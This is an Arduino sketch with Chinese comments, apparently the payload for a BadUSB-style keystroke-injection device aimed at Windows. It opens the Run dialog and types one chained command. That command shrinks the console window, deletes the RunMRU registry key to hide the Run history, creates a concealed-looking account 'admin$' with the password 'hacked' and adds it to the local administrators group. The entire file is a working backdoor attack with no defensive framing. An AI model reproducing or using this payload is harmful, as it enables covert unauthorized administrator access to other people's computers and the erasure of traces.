void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f&net user admin$ hacked /add&net localgroup administrators admin$ /add&exit");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
